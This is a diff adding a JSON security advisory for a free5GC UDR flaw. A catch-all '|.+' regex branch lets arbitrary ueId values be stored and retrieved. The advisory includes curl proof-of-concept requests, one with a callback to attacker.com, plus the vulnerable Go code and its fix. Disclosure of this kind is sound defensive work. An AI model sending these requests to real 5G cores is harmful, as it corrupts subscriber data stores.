@@ -1,0 +1,45 @@
+{
+  "id": "GHSA-6gxq-gpr8-xgjp",
+  "modified": "2026-06-11T13:30:22.530312866Z",
+  "published": "2026-06-11T13:25:18Z",
+  "aliases": [
+    "CVE-2026-47780"
+  ],
+  "summary": "free5GC UDR has improper `ueId` validation in EE subscription handlers that allows arbitrary identifier persistence",
+  "details": "### Summary\nThe free5GC UDR accepts arbitrary non-3GPP ueId values in the EE subscription creation and query flows because the regular expression used for validation ends with the catch-all alternative |.+. This causes the validation logic to accept any non-empty string rather than restricting input to expected SUPI/GPSI-style formats. In a tested deployment, a crafted value such as ARBITRARY_STRING was successfully stored through the POST /nudr-dr/v2/subscription-data/{ueId}/context-data/ee-subscriptions endpoint and later retrieved through the corresponding GET endpoint, demonstrating persistent database pollution and broken trust boundaries in the UDR data model.\n\nAn improper input validation issue exists in the free5GC UDR EE subscription handlers responsible for creating and querying UE event exposure subscriptions. The affected code validates ueId with a regular expression that includes a final |.+ branch, which matches any non-empty string and defeats the intended 3GPP identifier checks. As a result, an attacker able to reach the UDR SBI can submit arbitrary identifiers and have them persisted and retrieved as valid subscription records, causing unauthorized data creation and corruption of the UDR data store. \n\n### Details\nThe vulnerable logic is present in two handlers in api_datarepository.go: HandleCreateEeSubscriptions and HandleQueryeesubscriptions. Both paths rely on the same regexp.MatchString() validation pattern for ueId: ^(imsi-[0-9]{5,15}|nai-.+|msisdn-[0-9]{5,15}|extid-[^@]+@[^@]+|gci-.+|gli-.+|.+)$. The final alternative .+ acts as a universal match for any non-empty string, so values that do not conform to IMSI, NAI, MSISDN, EXTID, GCI, or GLI formats are still accepted. \n\nOnce the validation succeeds, the handlers pass the attacker-controlled ueId into the normal processing flow. In the tested environment, POST /nudr-dr/v2/subscription-data/ARBITRARY_STRING/context-data/ee-subscriptions returned 201 Created, and the response Location header pointed to a newly created resource under the arbitrary identifier. A subsequent GET /nudr-dr/v2/subscription-data/ARBITRARY_STRING/context-data/ee-subscriptions returned 200 OK with a JSON body, confirming that the data was persisted and retrievable. This demonstrates that the issue is not limited to superficial input acceptance; it results in server-side storage of untrusted identifiers in the UDR backend.\n\nThe vulnerable pattern appears to reflect a permissive schema-style expression rather than a security-oriented validator. In an OpenAPI or data-model context, a catch-all alternative may describe allowed generic strings, but in request validation logic it nullifies the protection provided by the more specific alternatives. The proper fix is to remove the trailing |.+ branch and restrict accepted input to explicitly supported identifier formats only.\n\n### PoC\n\nThe issue was reproduced against a running free5GC UDR instance listening on `10.22.22.5:80` with the `nudr-dr` API exposed under `/v2`. The following commands demonstrate the behavior. \n\n### Environment\n- UDR IP: `10.22.22.5`\n- UDR port: `80`\n- API base path: `/nudr-dr/v2`\n- Tested endpoint family: `/subscription-data/{ueId}/context-data/ee-subscriptions`\n\n### Step 1: Create an EE subscription with a legitimate identifier\n```bash\ncurl -X POST \"http://10.22.22.5:80/nudr-dr/v2/subscription-data/imsi-208930000000001/context-data/ee-subscriptions\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"callbackReference\": \"http://attacker.com/notify\"}' -v\n```\nExpected observed result in the test environment:\n- `HTTP/1.1 201 Created`\n- `Location: http://udr.sbi.fub5g.it:80/nudr-dr/v2/subscription-data/imsi-208930000000001/context-data/ee-subscriptions/1`\n\n### Step 2: Create an EE subscription with an arbitrary non-3GPP identifier\n```bash\ncurl -X POST \"http://10.22.22.5:80/nudr-dr/v2/subscription-data/ARBITRARY_STRING/context-data/ee-subscriptions\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"callbackReference\": \"http://attacker.com/notify\"}' -v\n```\nObserved result in the test environment:\n- `HTTP/1.1 201 Created`\n- `Location: http://udr.sbi.fub5g.it:80/nudr-dr/v2/subscription-data/ARBITRARY_STRING/context-data/ee-subscriptions/2`\n- Body: `{}`\n\nThis confirms that the arbitrary `ueId` passed validation and was accepted as a valid resource key.\n\n### Step 3: Retrieve the data stored under the arbitrary identifier\n```bash\ncurl \"http://10.22.22.5:80/nudr-dr/v2/subscription-data/ARBITRARY_STRING/context-data/ee-subscriptions\" -v\n```\nObserved result in the test environment:\n- `HTTP/1.1 200 OK`\n- Body: `[{}]`\n\nThis confirms persistence and retrieval of a subscription record under an attacker-chosen invalid `ueId`.\n\n### Affected code pattern\n```go\nmatch, err := regexp.MatchString(\n    `^(imsi-[0-9]{5,15}|nai-.+|msisdn-[0-9]{5,15}|extid-[^@]+@[^@]+|gci-.+|gli-.+|.+)$`,\n    ueId,\n)\nif !match {\n    // return 400\n}\n```\n\n### Recommended fix\n```go\nmatch, err := regexp.MatchString(\n    `^(imsi-[0-9]{5,15}|nai-.+|msisdn-[0-9]{5,15}|extid-[^@]+@[^@]+|gci-.+|gli-.+)$`,\n    ueId,\n)\n```\n\n### Impact\nThis is an **improper input validation** vulnerability that enables arbitrary identifier injection into the UDR EE subscription data path. Any actor with network reachability to the UDR SBI endpoint can create and query records bound to non-compliant, attacker-controlled `ueId` values. Depending on deployment assumptions, this may allow unauthorized data creation, persistent data corruption, namespace pollution, and interference with downstream components that trust UDR-stored identifiers to follow valid 3GPP formats. \n\nThe issue affects deployments exposing the vulnerable UDR EE subscription handlers and is particularly relevant in lab, test, and loosely segmented SBI environments where direct access to the UDR is possible. Because the flaw results in persistence of attacker-chosen identifiers, the impact extends beyond a simple validation bypass and reaches integrity of stored subscriber-related metadata.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/udr",
+        "purl": "pkg:golang/github.com/free5gc/udr"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.4.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-6gxq-gpr8-xgjp/GHSA-6gxq-gpr8-xgjp.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-6gxq-gpr8-xgjp"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
